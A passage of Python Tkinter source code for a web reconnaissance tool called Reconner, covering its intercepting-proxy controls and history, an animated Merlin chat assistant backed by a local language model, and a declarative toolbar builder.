        state changes). With intercept ON, the forward/drop buttons also need a
        trapped flow; Open Browser just needs intercept on."""
        on = bool(self.controller and self.controller.intercept)
        have = self._current is not None
        caught = have and self._current.status is not None
        self.fwd_btn.config(state=('normal' if on and have else 'disabled'))
        self.drop_btn.config(state=('normal' if on and have else 'disabled'))
        self.open_btn.config(state=('normal' if on else 'disabled'))
        # Save as Node needs a sent request with a caught response — independent
        # of the intercept toggle.
        self.save_node_btn.config(state=('normal' if caught else 'disabled'))

    # ── actions ──
    def _edited_head_body(self):
        """The editor's (head, body) raw text for the flow's current phase."""
        if self._current is not None and self._current.phase == 'response':
            return (self.resp_txt.get('1.0', 'end'),
                    self.resp_body_txt.get('1.0', 'end'))
        return (self.req_txt.get('1.0', 'end'),
                self.body_txt.get('1.0', 'end'))

    def _forward(self):
        """Forward the current flow one step (request → fetch + trap response;
        response → deliver), applying any edits."""
        if not (self.controller and self._current):
            return
        head, body = self._edited_head_body()
        self.controller.resolve('forward', head, body)

    def _drop(self):
        """Drop the current flow (the client gets a 502 / the connection closes)."""
        if not (self.controller and self._current):
            return
        self.controller.resolve('drop')

    def _open_browser(self):
        """Launch the system browser through the proxy (delegates to the app)."""
        if self.on_open_browser:
            self.on_open_browser()

    # ── save as node (shared with the History popup) ──
    @staticmethod
    def _classify_node_type(url, status, content_type):
        """Pick a tree node type from the response (mirrors the auto-capture
        classifier)."""
        ct = (content_type or '').lower()
        path = (urlparse(url).path or '').lower()
        if status and 300 <= status < 400:
            return 'redirect'
        if 'javascript' in ct or path.endswith('.js'):
            return 'script'
        if 'html' in ct:
            return 'page'
        if any(path.endswith(e) for e in ('.css', '.png', '.jpg', '.jpeg', '.gif',
                                          '.svg', '.ico', '.woff', '.woff2', '.ttf')):
            return 'file'
        if 'json' in ct or 'xml' in ct:
            return 'endpoint'
        return 'page'

    @staticmethod
    def _referer_parent(req_headers, self_url):
        """The Referer URL to use as the node's parent (so it nests under the page
        that triggered it), or None when absent / self-referential."""
        for k, v in (req_headers or {}).items():
            if k.lower() == 'referer' and v and v != self_url:
                return v
        return None

    @classmethod
    def build_node(cls, method, url, req_headers, req_body, status, reason,
                   resp_headers, resp_body):
        """Build a user-created (edited=True) SiteNode from a captured request /
        response, parented to its Referer. Shared by the panel button and the
        History popup so both produce identical nodes."""
        req_headers = dict(req_headers or {})
        resp_headers = dict(resp_headers or {})
        ct = resp_headers.get('Content-Type', '') or next(
            (v for k, v in resp_headers.items() if k.lower() == 'content-type'),
            '')
        node = SiteNode(url=url,
                        node_type=cls._classify_node_type(url, status, ct),
                        parent_url=cls._referer_parent(req_headers, url))
        body = req_body.decode('utf-8', 'replace') \
            if isinstance(req_body, bytes) else (req_body or '')
        rbody = resp_body.decode('utf-8', 'replace') \
            if isinstance(resp_body, bytes) else (resp_body or '')
        node.req_method = method
        node.req_url = url
        node.req_headers = req_headers
        node.req_body = body
        node.headers = req_headers
        node.status_code = status
        node.resp_status = status
        node.resp_reason = reason or ''
        node.resp_headers = resp_headers
        node.resp_body = rbody
        node.content_type = ct
        node.raw_html = rbody
        node.text_content = rbody
        node.scanned = True
        node.edited = True
        return node

    def _save_as_node(self):
        """Save the displayed (sent + caught) flow as a graph node."""
        f = self._current
        if not (f is not None and f.status is not None and self.on_save_node):
            return
        node = self.build_node(f.method, f.url, f.req_headers, f.req_body,
                               f.status, f.reason, f.resp_headers, f.resp_body)
        self.on_save_node(node)

    # ── history ──
    def record_flow(self, flow):
        """Snapshot a completed proxied transaction into the history (and push it
        to an open History popup). Called on the UI thread for every flow the
        proxy relays, trapped or not."""
        rq_head, rq_body = split_req_body(flow.raw_request())
        rs_head, rs_body = split_req_body(flow.raw_response())
        req_size = len(flow.req_body) if isinstance(flow.req_body, bytes) \
            else len((flow.req_body or '').encode('utf-8', 'replace'))
        resp_size = len(flow.resp_body) if isinstance(flow.resp_body, bytes) \
            else len((flow.resp_body or '').encode('utf-8', 'replace'))
        rec = {
            'id': flow.id,
            'method': flow.method,
            'url': flow.url,
            'status': flow.status,
            'reason': flow.reason,
            'req_size': req_size,
            'resp_size': resp_size,
            'req_headers': dict(flow.req_headers),
            'resp_headers': dict(flow.resp_headers),
            'req_head': rq_head,
            'req_body': rq_body,
            'resp_head': rs_head,
            'resp_body': rs_body,
        }
        self.history.append(rec)
        if self._history_win is not None:
            self._history_win.add_row(rec)

    def _open_history(self):
        """Open (or focus) the proxy History popup."""
        if self._history_win is not None and self._history_win.winfo_exists():
            self._history_win.lift()
            self._history_win.focus_force()
            return
        self._history_win = ProxyHistoryDialog(self.winfo_toplevel(), self)


# ─────────────────────────────────────────────
# Merlin — Office-Assistant-style animated character (clippy.js assets)
# ─────────────────────────────────────────────
class MerlinAgent:
    """Loader/animator for a clippy.js 'Merlin' agent. Parses the agent's
    `agent.js` (a `clippy.ready('Merlin', {…})` wrapper around pure JSON) and its
    `map.png` sprite sheet, then hands out composited per-frame ImageTk images and
    each frame's duration. Pure data + image slicing — playback timing is driven by
    whoever consumes it (the test dialog's `.after()` loop).

    `agent.js` shape: `framesize` [w,h], `overlayCount`, and `animations` — a dict
    of name → {frames:[{duration, images:[[x,y],…], …}]}. Each frame's `images`
    are pixel offsets into the sheet (stacked overlays). The sheet has a real alpha
    channel, so frames composite cleanly over any background."""

    DEFAULT_DIR = os.path.expanduser(
        '~/Documents/Projects/Clippy/clippy.js/agents/Merlin')

    def __init__(self, assets_dir=None, scale=1.0):
        """Load from `assets_dir` (default: the standard clippy.js Merlin path).
        `scale` enlarges (or shrinks) the rendered character. On any failure
        `available()` returns False and `error` explains why."""
        self.dir = assets_dir or self.DEFAULT_DIR
        self.scale = float(scale)
        self.framesize = (128, 128)
        self.animations = {}
        self.error = ''
        self._sheet = None              # PIL.Image (RGBA)
        self._cache = {}                # (anim, idx) -> ImageTk.PhotoImage
        self._load()

    def display_size(self):
        """The on-screen (scaled) frame size — what the stage Label should be."""
        w, h = self.framesize
        return (max(1, round(w * self.scale)), max(1, round(h * self.scale)))

    def _load(self):
        """Parse agent.js + open map.png; record `error` and bail on failure."""
        agent = os.path.join(self.dir, 'agent.js')
        sheet = os.path.join(self.dir, 'map.png')
        try:
            from PIL import Image          # noqa: F401  (probe availability)
        except Exception:
            self.error = 'Pillow (PIL) is not installed — pip install pillow.'
            return
        if not (os.path.isfile(agent) and os.path.isfile(sheet)):
            self.error = (f'Merlin assets not found in:\n{self.dir}\n\n'
                          'Expected agent.js + map.png (clippy.js Merlin agent).')
            return
        try:
            raw = open(agent, encoding='utf-8', errors='replace').read()
            m = re.search(r"clippy\.ready\(\s*'[^']*'\s*,\s*(\{.*\})\s*\)\s*;?\s*$",
                          raw, re.S)
            if not m:
                self.error = 'agent.js is not in the expected clippy.ready(...) form.'
                return
            data = json.loads(m.group(1))
            self.framesize = tuple(data.get('framesize', [128, 128]))
            self.animations = data.get('animations', {})
            from PIL import Image
            self._sheet = Image.open(sheet).convert('RGBA')
        except Exception as e:
            self.error = f'Failed to load Merlin assets: {e}'
            self.animations = {}

    def available(self):
        """True when the sheet + at least one animation loaded."""
        return bool(self._sheet is not None and self.animations)

    def names(self):
        """Sorted animation names."""
        return sorted(self.animations)

    def frames(self, anim):
        """The raw frame list for `anim` (empty when unknown)."""
        a = self.animations.get(anim)
        return a.get('frames', []) if a else []

    def duration(self, anim, idx):
        """Frame `idx`'s duration in ms (clamped to a sane minimum)."""
        fr = self.frames(anim)
        if 0 <= idx < len(fr):
            return max(20, int(fr[idx].get('duration', 100)))
        return 100

    def frame_image(self, anim, idx):
        """A cached ImageTk.PhotoImage for frame `idx` of `anim`: the frame's
        overlay images composited over transparency. None when out of range or a
        frame carries no image (a pure pause)."""
        key = (anim, idx)
        if key in self._cache:
            return self._cache[key]
        fr = self.frames(anim)
        if not (self._sheet is not None and 0 <= idx < len(fr)):
            return None
        imgs = fr[idx].get('images') or []
        if not imgs:
            self._cache[key] = None
            return None
        from PIL import Image, ImageTk
        w, h = self.framesize
        canvas = Image.new('RGBA', (w, h), (0, 0, 0, 0))
        for off in imgs:
            try:
                x, y = int(off[0]), int(off[1])
                tile = self._sheet.crop((x, y, x + w, y + h))
                canvas.alpha_composite(tile)
            except Exception:
                continue
        if self.scale != 1.0:
            canvas = canvas.resize(self.display_size(), Image.LANCZOS)
        photo = ImageTk.PhotoImage(canvas)
        self._cache[key] = photo
        return photo


class WizardAnimator:
    """Drives the Merlin sprite on a Tk Label through the animation cycles defined
    in anim.txt. One frame loop runs at a time (`.after`-driven, honouring each
    frame's own duration); a separate timer schedules the idle rests. A single
    generalised "looped state" (intro → repeating loop → optional outro → `then`)
    powers the listening / thinking / sending cycles; the outro target is chosen at
    stop time so the same machinery handles "deselect → idle" vs "send → thinking".

    Names that the loaded agent lacks are skipped, so a different agent still runs.
    """

    OPEN = ['Announce', 'Greet', 'Wave', 'Show']
    CLOSE = ['Greet', 'Wave', 'Hide']
    IDLE = ['Idle1_1', 'Idle1_2', 'Idle1_3', 'Idle1_4',
            'Idle2_1', 'Idle2_2', 'Idle3_1', 'Idle3_2']
    LISTEN_START = ['Confused', 'Hearing_1', 'Hearing_2', 'Hearing_3', 'Hearing_4',
                    'StartListening']
    # (intro, looped, outro) — outro None means the loop just ends.
    THINK_VARIANTS = [('Think', 'Thinking', None),
                      ('Search', 'Searching', None),
                      ('Read', 'ReadContinued', 'ReadReturn')]
    SEND_VARIANTS = [('Write', 'WriteContinued', 'WriteReturn'),
                     ('Process', 'Processing', None)]
    TRICKS = ['Congratulate', 'Congratulate_2', '__magic__']  # magic = DoMagic1+2
    REST = 'RestPose'
    IDLE_REST_MS = (7000, 14000)        # random RestPose spell between idle moves

    def __init__(self, stage_label, agent, tk_widget):
        """`stage_label` is painted on; `agent` is the MerlinAgent; `tk_widget` is
        any live widget used for `.after`."""
        self.label = stage_label
        self.agent = agent
        self.tk = tk_widget
        self._mode = 'off'              # off/open/idle/listening/thinking/sending/
        #                                 outro/trick/close
        self._frame_after = None
        self._gap_after = None
        self._cur_photo = None
        # current looped-state config
        self._loop = None
        self._loop_outro = None
        self._loop_then = None
        self._loop_stop = False

    # ── low-level frame playback ──
    def _show(self, anim, idx):
        """Paint frame `idx` of `anim`, keeping a ref so Tk can't GC it."""
        photo = self.agent.frame_image(anim, idx)
        if photo is not None:
            try:
                self.label.config(image=photo)
            except tk.TclError:
                return
            self._cur_photo = photo

    def _play(self, anim, on_done=None):
        """Play `anim` once, then call `on_done`. Replaces any running animation."""
        self._cancel_frames()
        frames = self.agent.frames(anim)
        if not frames:
            if on_done:
                self._frame_after = self.tk.after(1, on_done)
            return
        st = {'i': 0}

        def step():
            i = st['i']
            if i >= len(frames):
                self._frame_after = None
                if on_done:
                    on_done()
                return
            self._show(anim, i)
            dur = self.agent.duration(anim, i)
            st['i'] += 1
            self._frame_after = self.tk.after(dur, step)
        step()

    def _play_sequence(self, anims, on_done=None):
        """Play a list of animations back to back, then call `on_done`."""
        q = [a for a in anims if a]

        def nxt():
            if not q:
                if on_done:
                    on_done()
                return
            self._play(q.pop(0), nxt)
        nxt()

    def _pick(self, names):
        """A random animation the agent actually has (else RestPose)."""
        avail = [n for n in names if self.agent.frames(n)]
        return random.choice(avail) if avail else self.REST

    def _cancel_frames(self):
        if self._frame_after is not None:
            try:
                self.tk.after_cancel(self._frame_after)
            except Exception:
                pass
            self._frame_after = None

    def _cancel_gap(self):
        if self._gap_after is not None:
            try:
                self.tk.after_cancel(self._gap_after)
            except Exception:
                pass
            self._gap_after = None

    def stop(self):
        """Halt everything (teardown)."""
        self._mode = 'off'
        self._cancel_frames()
        self._cancel_gap()

    # ── generalised looped state (listening / thinking / sending) ──
    def _begin_loop(self, intro, loop, outro):
        """Play `intro`, then repeat `loop` until `end_loop` is called, then play
        `outro` (if any) and run the stored `then`. Does NOT clear `_loop_stop` —
        a stop requested during the cycle's intro (before the loop starts) must
        still be honoured; each cycle-start method clears it instead."""
        self._loop = loop
        self._loop_outro = outro
        self._play(intro, self._loop_step)

    def _loop_step(self):
        """One pass of the active loop, or its wind-down once stop was requested."""
        if self._mode not in ('listening', 'thinking', 'sending'):
            return
        if self._loop_stop:
            then = self._loop_then or self.start_idle
            self._mode = 'outro'
            if self._loop_outro and self.agent.frames(self._loop_outro):
                self._play(self._loop_outro, then)
            else:
                then()
            return
        self._play(self._loop, self._loop_step)

    def _end_loop(self, then):
        """Ask the active loop to finish (outro → `then`). If a loop isn't running
        yet (still in its intro) the request is honoured when the intro ends; if no
        loop is active at all, `then` runs immediately."""
        self._loop_then = then
        self._loop_stop = True
        if self._mode not in ('listening', 'thinking', 'sending'):
            then()

    # ── open / close ──
    def play_open(self, then):
        """Open cycle: one random greeting, then `then` (idle)."""
        self._mode = 'open'
        self._cancel_gap()
        self._play(self._pick(self.OPEN), then)

    def play_close(self, on_done):
        """Close cycle: one random farewell (greet/wave/hide), then `on_done`."""
        self._mode = 'close'
        self._cancel_gap()
        self._cancel_frames()
        self._play(self._pick(self.CLOSE), on_done)

    # ── idle ──
    def start_idle(self):
        """Idle cycle: rest, then random idle moves with random 7–14 s rests."""
        self._mode = 'idle'
        self._cancel_gap()
        self._show(self.REST, 0)
        self._schedule_idle()

    def _schedule_idle(self):
        if self._mode != 'idle':
            return
        self._cancel_gap()
        self._gap_after = self.tk.after(
            random.randint(*self.IDLE_REST_MS), self._do_idle)

    def _do_idle(self):
        if self._mode != 'idle':
            return

        def after_idle():
            if self._mode != 'idle':
                return
            self._show(self.REST, 0)
            self._schedule_idle()
        self._play(self._pick(self.IDLE), after_idle)

    # ── listening (user typing in chat) ──
    def start_listening(self):
        """Typing cycle: a random listen-start (confused/hearing/startlistening),
        then read → readcontinued loop. Only engages from idle."""
        if self._mode != 'idle':
            return
        self._mode = 'listening'
        self._cancel_gap()
        self._loop_then = self.start_idle
        self._loop_stop = False

        def to_read():
            if self._mode != 'listening':
                return
            self._begin_loop('Read', 'ReadContinued', 'ReadReturn')
        self._play(self._pick(self.LISTEN_START), to_read)

    def end_listening(self):
        """Chat deselected without sending: gracefully wind the read loop down
        (readreturn) and return to idle."""
        self._end_loop(self.start_idle)

    def _reading(self):
        """True while a read-style loop is actually running (so we know to play a
        ReadReturn before interrupting it)."""
        return (self._mode in ('listening', 'thinking')
                and self._loop == 'ReadContinued'
                and self.agent.frames('ReadReturn'))

    def go_thinking(self):
        """User sent input: switch to the thinking cycle NOW (a quick ReadReturn
        first if we were reading), interrupting any listening intro — so thinking
        always shows promptly rather than waiting on a long wind-down."""
        if self._reading():
            self._mode = 'outro'
            self._play('ReadReturn', self.start_thinking)
        else:
            self.start_thinking()

    # ── thinking (model is silent) ──
    def start_thinking(self):
        """Thinking cycle: confused, then a random think/search/read loop."""
        self._mode = 'thinking'
        self._cancel_gap()
        self._loop_then = self.start_idle
        self._loop_stop = False
        avail = [v for v in self.THINK_VARIANTS if self.agent.frames(v[1])]
        intro, loop, outro = random.choice(avail) if avail else \
            ('Think', 'Thinking', None)

        def after_confused():
            if self._mode != 'thinking':
                return
            self._begin_loop(intro, loop, outro)
        if self.agent.frames('Confused'):
            self._play('Confused', after_confused)
        else:
            after_confused()

    def thinking_to_sending(self):
        """Output started: switch to the sending cycle NOW (a quick ReadReturn
        first if the thinking variant was reading), interrupting the thinking loop
        — so the sending/writing animation always shows while output streams."""
        if self._reading():
            self._mode = 'outro'
            self._play('ReadReturn', self.start_sending)
        else:
            self.start_sending()

    # ── sending (output is streaming) ──
    def start_sending(self):
        """Sending cycle: a random write→writecontinued→writereturn or
        process→processing loop."""
        self._mode = 'sending'
        self._cancel_gap()
        self._loop_then = self.start_idle
        self._loop_stop = False
        avail = [v for v in self.SEND_VARIANTS if self.agent.frames(v[1])]
        intro, loop, outro = random.choice(avail) if avail else \
            ('Write', 'WriteContinued', 'WriteReturn')
        self._begin_loop(intro, loop, outro)

    def stop_sending(self):
        """Output finished: play the outro (writereturn) and return to idle."""
        self._end_loop(self.start_idle)

    # ── trick (clicking a Reconner widget) ──
    def trick(self):
        """A random celebration — only while idle, so it never interrupts a
        listening/thinking/sending cycle."""
        if self._mode != 'idle':
            return
        self._mode = 'trick'
        self._cancel_gap()
        choice = random.choice([t for t in self.TRICKS
                                if t == '__magic__'
                                or self.agent.frames(t)] or [self.REST])
        if choice == '__magic__':
            self._play_sequence(['DoMagic1', 'DoMagic2'], self.start_idle)
        else:
            self._play(choice, self.start_idle)


class WizardAssistantDialog(tk.Toplevel):
    """The animated Wizard: a Merlin character that runs the anim.txt cycles —
    greets on open, idles with rests, reacts while you type in the chat, thinks
    while `wizard-ai` is silent, performs a contextual sending animation while it
    streams its reply, celebrates when you click a Reconner widget, and plays a
    farewell on close (deferring the close until the animation finishes)."""

    def __init__(self, parent, agent, ai, model='wizard-ai'):
        """Build over a loaded MerlinAgent + the app's `ollama` client."""
        super().__init__(parent, bg=C['bg'])
        self.agent = agent
        self.ai = ai
        self.model = model
        self.title('Wizard')
        self.configure(bg=C['bg'])
        self.history = []
        self._busy = False
        self._closing = False
        self._stream_cancel = False
        self._first_token = True
        self._wiz_buf = []
        self._app_click_bind = None
        self.animator = None
        self._build()
        if not self.agent.available():
            self._show_error()
            self.protocol('WM_DELETE_WINDOW', self.destroy)
            return
        self.animator = WizardAnimator(self.stage, self.agent, self)
        self.protocol('WM_DELETE_WINDOW', self._on_close)
        # Clicking any Reconner widget (in the main window) triggers a trick — the
        # toplevel is in every child widget's bindtags, so one bind catches them
        # all. Guarded to idle in the animator.
        try:
            self._app_click_bind = self.master.bind(
                '<Button-1>', self._on_app_click, add='+')
        except Exception:
            self._app_click_bind = None
        self.after(150, lambda: self.animator.play_open(self.animator.start_idle))

    def _build(self):
        """Wizard on the left, speech-balloon transcript on the right, with the
        input spanning the full width of the popup along the bottom."""
        # Full-width input along the popup's bottom edge (Enter sends — no button).
        row = tk.Frame(self, bg=C['bg'])
        row.pack(side='bottom', fill='x', padx=8, pady=(0, 8))
        self.input_var = tk.StringVar()
        self.entry = tk.Entry(row, textvariable=self.input_var, font=C['font'],
                              relief='sunken', bd=2, bg=C['window'],
                              highlightthickness=0)
        self.entry.pack(fill='x', expand=True)

        body = tk.Frame(self, bg=C['bg'])
        body.pack(side='top', fill='both', expand=True, padx=8, pady=(8, 0))

        # The wizard sits on the plain panel grey (like the Office Assistant).
        left = tk.Frame(body, bg=C['bg'])
        left.pack(side='left', fill='y')
        w, h = self.agent.display_size() if self.agent.available() else (128, 128)
        self.stage = tk.Label(left, bg=C['bg'], width=w, height=h,
                              relief='flat', bd=0, cursor='hand2')
        self.stage.pack(pady=(8, 0))
        self.stage.bind('<Button-1>', lambda _e: self._on_trick())

        right = tk.Frame(body, bg=C['bg'])
        right.pack(side='left', fill='both', expand=True, padx=(8, 0))

        # The transcript lives inside a pale-yellow speech balloon (a Canvas-drawn
        # rounded box with a tail pointing at the wizard's head).
        self._balloon_bg = '#fff59d'
        self.balloon = tk.Canvas(right, bg=C['bg'], highlightthickness=0, bd=0)
        self.balloon.pack(side='top', fill='both', expand=True)
        inner = tk.Frame(self.balloon, bg=self._balloon_bg)
        self.transcript = Text95(inner, width=40, height=14, wrap='word',
                                 bg=self._balloon_bg, relief='flat', bd=0)
        tsb = tk.Scrollbar(inner, orient='vertical',
                           command=self.transcript.yview)
        self.transcript.config(yscrollcommand=tsb.set)
        self.transcript.pack(side='left', fill='both', expand=True)
        tsb.pack(side='right', fill='y')
        self.transcript.tag_config('you', foreground=C['title_bg'],
                                   font=C['font_b'])
        self.transcript.tag_config('wiz', foreground='#2e7d32',
                                   font=C['font_b'])
        self._balloon_win = self.balloon.create_window(0, 0, anchor='nw',
                                                       window=inner)
        self.balloon.bind('<Configure>', self._draw_balloon)
        self.entry.bind('<Return>', self._send)
        # Typing-in-chat cycle: engage only when the user actually TYPES (not on
        # mere focus/selection), wind down on deselect.
        self.entry.bind('<KeyPress>', self._on_entry_type)
        self.entry.bind('<FocusOut>', self._on_entry_unfocus)
        if self.agent.available():
            self.entry.focus_set()

    @staticmethod
    def _round_rect(x1, y1, x2, y2, r):
        """Point list for a rounded rectangle drawn as a smooth canvas polygon."""
        return [x1 + r, y1, x2 - r, y1, x2, y1, x2, y1 + r, x2, y2 - r, x2, y2,
                x2 - r, y2, x1 + r, y2, x1, y2, x1, y2 - r, x1, y1 + r, x1, y1]

    def _draw_balloon(self, _e=None):
        """Redraw the yellow speech balloon to fit the canvas and size the embedded
        transcript inside it. Drawn as a rounded body + a tail on the left edge
        pointing at the wizard; the tail/body seam is hidden with a fill-coloured
        line so it reads as one balloon."""
        c = self.balloon
        w, h = c.winfo_width(), c.winfo_height()
        if w < 40 or h < 40:
            return
        c.delete('shape')
        pad, r, tail_w = 4, 16, 18
        left, top, rgt, bot = pad + tail_w, pad, w - pad, h - pad
        c.create_polygon(self._round_rect(left, top, rgt, bot, r), smooth=True,
                         fill=self._balloon_bg, outline='#808080', width=1,
                         tags='shape')
        # Tail near the top so it lines up with the wizard's head (the stage sits
        # at the top of the left column).
        ty = top + 32
        c.create_polygon(left, ty - 9, left, ty + 19, pad, ty + 7,
                         fill=self._balloon_bg, outline='#808080', width=1,
                         tags='shape')
        # Erase the body/tail outline where they join.
        c.create_line(left, ty - 9, left, ty + 19, fill=self._balloon_bg,
                      width=2, tags='shape')
        ipad = 12
        c.coords(self._balloon_win, left + ipad, top + ipad)
        c.itemconfig(self._balloon_win, width=rgt - left - 2 * ipad,
                     height=bot - top - 2 * ipad)
        c.tag_lower('shape')
        c.tag_raise(self._balloon_win)

    def _show_error(self):
        for w in self.winfo_children():
            w.destroy()
        tk.Label(self, text='The Wizard cannot appear', bg=C['bg'],
                 fg=C['err'], font=C['font_b']).pack(padx=16, pady=(16, 4))
        tk.Message(self, text=self.agent.error or 'Unknown error.', bg=C['bg'],
                   fg=C['black'], font=C['font'], width=380).pack(padx=16,
                                                                  pady=(0, 8))
        Btn(self, text=' Close ', command=self.destroy).pack(pady=(0, 14))

    # ── typing-in-chat hooks ──
    def _on_entry_type(self, e=None):
        """Engage the listening cycle when the user actually TYPES in the chat
        (not merely focuses/selects it). The Enter key is ignored here — it sends."""
        if e is not None and e.keysym in ('Return', 'KP_Enter'):
            return
        if not (self._busy or self._closing) and self.animator is not None:
            self.animator.start_listening()

    def _on_entry_unfocus(self, _e=None):
        """Deselecting the chat ends listening → idle — but only if it wasn't a
        send (deferred so a Send-button click can flip _busy first)."""
        self.after(1, self._maybe_deselect)

    def _maybe_deselect(self):
        if self._busy or self._closing or self.animator is None:
            return
        if self.animator._mode in ('listening', 'outro'):
            self.animator.end_listening()

    # ── chat ──
    def _append(self, who, text, tag):
        self.transcript.insert('end', f'{who}: ', tag)
        self.transcript.insert('end', text + '\n\n')
        self.transcript.see('end')

    def _send(self, *_):
        """Send the input to wizard-ai: readreturn → thinking → (stream) sending."""
        if self._busy or self._closing:
            return
        text = self.input_var.get().strip()
        if not text:
            return
        self.input_var.set('')
        self._append('You', text, 'you')
        self.history.append({'role': 'user', 'content': text})
        self._busy = True
        self._first_token = True
        self._wiz_buf = []
        self._stream_cancel = False
        self._q = queue.Queue()
        self.entry.config(state='disabled')   # no Send button — Enter sends
        # listening → readreturn → thinking cycle (or straight to thinking).
        self.animator.go_thinking()
        threading.Thread(target=self._run_stream, args=(list(self.history),),
                         daemon=True).start()
        self._drain()

    def _run_stream(self, history):
        """Worker thread: stream into a thread-safe queue (never touches Tk)."""
        def on_token(chunk):
            self._q.put(('tok', chunk))
        full = self.ai.chat_stream(
            history, model=self.model, on_token=on_token,
            is_cancelled=lambda: self._stream_cancel)
        self._q.put(('done', full))

    def _drain(self):
        """UI thread: apply queued tokens/completion, reschedule while in flight."""
        try:
            while True:
                kind, payload = self._q.get_nowait()
                if kind == 'tok':
                    self._on_token(payload)
                else:
                    self._on_done(payload)
        except queue.Empty:
            pass
        if self._busy and not self._closing:
            self.after(30, self._drain)

    def _on_token(self, chunk):
        """First chunk: thinking → sending + open the wizard's line; then stream."""
        if self._closing:
            return
        if self._first_token:
            self._first_token = False
            self.transcript.insert('end', 'Wizard: ', 'wiz')
            self.transcript.see('end')
            self.animator.thinking_to_sending()
        self._wiz_buf.append(chunk)
        self.transcript.insert('end', chunk)
        self.transcript.see('end')

    def _on_done(self, full):
        """Stream finished: close the line, record it, play the sending outro."""
        if self._closing:
            return
        if self._first_token:
            self.transcript.insert('end', 'Wizard: ', 'wiz')
            self.transcript.insert('end', full or '…')
            self.animator.thinking_to_sending()
        self.transcript.insert('end', '\n\n')
        self.transcript.see('end')
        reply = ''.join(self._wiz_buf) or full
        if reply:
            self.history.append({'role': 'assistant', 'content': reply})
        self._busy = False
        self.entry.config(state='normal')
        self.entry.focus_set()
        self.animator.stop_sending()

    # ── tricks ──
    def _on_trick(self):
        """Click on the wizard → a trick (when idle)."""
        if self.animator and not self._closing:
            self.animator.trick()

    def _on_app_click(self, _e=None):
        """Click on any Reconner widget → a trick (when the wizard is idle)."""
        if self._closing or not self.winfo_exists():
            return
        if self.animator is not None:
            self.animator.trick()

    # ── close (deferred until the farewell animation finishes) ──
    def _on_close(self):
        if self._closing:
            return
        self._closing = True
        self._stream_cancel = True
        try:
            self.entry.config(state='disabled')
        except Exception:
            pass
        if self.animator is not None:
            self.animator.play_close(self._finish_close)
        else:
            self._finish_close()

    def _finish_close(self):
        """Unhook the app-click bind, tear down the animator, destroy the window."""
        if self._app_click_bind is not None:
            try:
                self.master.unbind('<Button-1>', self._app_click_bind)
            except Exception:
                pass
            self._app_click_bind = None
        if self.animator is not None:
            self.animator.stop()
        self.destroy()
# ─────────────────────────────────────────────
# gui — declarative (matrix-driven) widget construction
# ─────────────────────────────────────────────
class gui:
    """Builds the application's widgets from declarative *matrices* — a list of
    rows where each row is one widget and its columns are its full config (id,
    type, label, size, variable, command, layout, …). Adding or editing a widget
    is therefore editing a data row, not code. Widget/variable handles are stored
    back onto the app object so the app's logic keeps addressing them by name.

    It also builds the two-row top toolbar (a responsive grid input row over an
    action row) and the status bar."""

    def __init__(self, app):
        """Hold references to the owning app and its root window."""
        self.app = app
        self.root = app.root
        self.toolbar = None

    # ── generic matrix → widgets builder ──────────────────────────────
    @staticmethod
    def _font(key):
        """Resolve a row's 'font' column: a C[...] key, an explicit tuple, or
        the default body font."""
        if key is None:
            return C['font']
        if isinstance(key, str):
            return C.get(key, C['font'])
        return key

    def _make_var(self, row):
        """Create + register the row's bound variable on the app, if any."""
        if not row.get('var'):
            return None
        var = (tk.BooleanVar() if row.get('var_kind') == 'bool'
               else tk.StringVar())
        if 'var_value' in row:
            var.set(row['var_value'])
        setattr(self.app, row['var'], var)
        return var

    def _make_widget(self, parent, row, var, cmd):
        """Create the widget for a row. The optional 'opts' column is a dict of
        extra constructor kwargs passed straight through (so any widget option
        is settable from the matrix — 'every widget config possible')."""
        typ = row.get('type', 'label')
        opts = dict(row.get('opts', {}))
        if typ == 'logo':
            self.app._logo_img = _app_icon_photo(row.get('size', 31))
            if self.app._logo_img is not None:
                return tk.Label(parent, image=self.app._logo_img,
                                text=row.get('text', ''), compound='left',
                                bg=C['title_bg'], fg=C['title_fg'],
                                font=('Courier', 10, 'bold'), padx=4, pady=2)
            return tk.Label(parent, text=row.get('fallback', ''),
                            bg=C['title_bg'], fg=C['title_fg'],
                            font=('Courier', 10, 'bold'), pady=4)
        if typ == 'label':
            kw = {'bg': C['bg'], 'font': self._font(row.get('font'))}
            if var is not None:
                kw['textvariable'] = var
            else:
                kw['text'] = row.get('text', '')
            if 'fg' in row:
                kw['fg'] = row['fg']
            kw.update(opts)
            return tk.Label(parent, **kw)
        if typ == 'entry':
            return Entry95(parent, textvariable=var, width=row.get('width', 10),
                           show=row.get('show', ''), **opts)
        if typ == 'button':
            kw = {'command': cmd}
            for k in ('bg', 'fg', 'state'):
                if k in row:
                    kw[k] = row[k]
            kw.update(opts)
            return Btn(parent, text=row.get('text', ''), **kw)
        if typ == 'checkbutton':
            kw = {'text': row.get('text', ''), 'variable': var, 'command': cmd,
                  'bg': C['bg'], 'activebackground': C['bg'],
                  'selectcolor': C['window'], 'highlightthickness': 0,
                  'font': self._font(row.get('font'))}
            kw.update(opts)
            return tk.Checkbutton(parent, **kw)
        if typ == 'progress':
            return Chicago95Progress(parent, width=row.get('width', 150),
                                     height=row.get('height', 16))
        if typ == 'statusbox':
            return StatusBox(parent, size=row.get('size', 18))
        return None

    def _register(self, w, row):
        """Store the widget on the app under its 'attr' and apply 'bind' rows."""
        if row.get('attr'):
            setattr(self.app, row['attr'], w)
        for ev, mname in row.get('bind', []):
            w.bind(ev, lambda e, m=mname: getattr(self.app, m)())

    def build_bar(self, parent, matrix):
        """Flat bar build (no groups/reflow): pack each row's widget directly,
        honouring side/padx/pady/fill/expand. Used for the statusbar."""
        for row in matrix:
            var = self._make_var(row)
            cmd = getattr(self.app, row['command']) if row.get('command') else None
            w = self._make_widget(parent, row, var, cmd)
            if w is None:
                continue
            pk = {'side': row.get('side', 'left'),
                  'padx': row.get('padx', 0), 'pady': row.get('pady', 0)}
            if 'fill' in row:
                pk['fill'] = row['fill']
            if row.get('expand'):
                pk['expand'] = True
            w.pack(**pk)
            self._register(w, row)

    # ── toolbar matrix + build ────────────────────────────────────────
    def build_toolbar(self):
        """Top toolbar in two rows. The input row stretches to fill the window:
        the URL entry takes all the stretch (weight 1) while the banner keeps a
        fixed size. The action row holds Tech Scan, the
        Modes selector, the Auth-scan toggle, Scan/Stop, progress, status and
        Settings. Per-host credentials are entered on demand during an Auth scan
        (no global user/pass fields)."""
        app = self.app
        self.toolbar = tk.Frame(self.root, bg=C['bg'], relief='raised', bd=2)
        self.toolbar.pack(fill='x')

        def mkvar(name, value=''):
            """Create a StringVar, store it on the app as `name`, and return it."""
